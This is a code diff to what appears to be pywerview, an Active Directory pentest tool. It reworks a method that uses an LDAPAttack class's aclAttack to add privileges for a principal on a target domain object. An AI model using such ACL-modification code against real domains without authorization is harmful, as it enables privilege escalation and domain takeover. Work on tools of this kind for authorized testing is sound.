@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
-from impacket.examples.ntlmrelayx.attacks.ldapattack import LDAPAttack
 from impacket.examples.ntlmrelayx.utils.config import NTLMRelayxConfig
 
+from pywerview.modules.ldapattack import LDAPAttack
 from pywerview.modules.addcomputer import ADDCOMPUTER
 from pywerview.utils.helpers import *
 
@@ -120,8 +120,7 @@ class PywerView:
         c.addcomputer = 'idk lol'
         c.target = self.dc_ip
 
-        logging.info(f'Adding {args.rights} privilege to {args.targetidentity}')
-        entries = self.get_domainobject(identity=args.targetidentity)
+        entries = self.get_domainobject(identity=args.principalidentity)
         if len(entries) == 0:
             logging.error('Target object not found in domain')
             return
@@ -129,7 +128,8 @@ class PywerView:
         identity_dn = entries[0].entry_dn
         logging.info(f'Found target dn {identity_dn}')
         
-        la = LDAPAttack(c, self.ldap_session, f'{self.domain}/{args.principalidentity}')
+        logging.info(f'Adding {args.rights} privilege to {args.targetidentity}')
+        la = LDAPAttack(c, self.ldap_session, f'{self.domain}/{args.principalidentity}', args)
         la.aclAttack(identity_dn, self.domain_dumper)
 
     def remove_domaincomputer(self,computer_name):
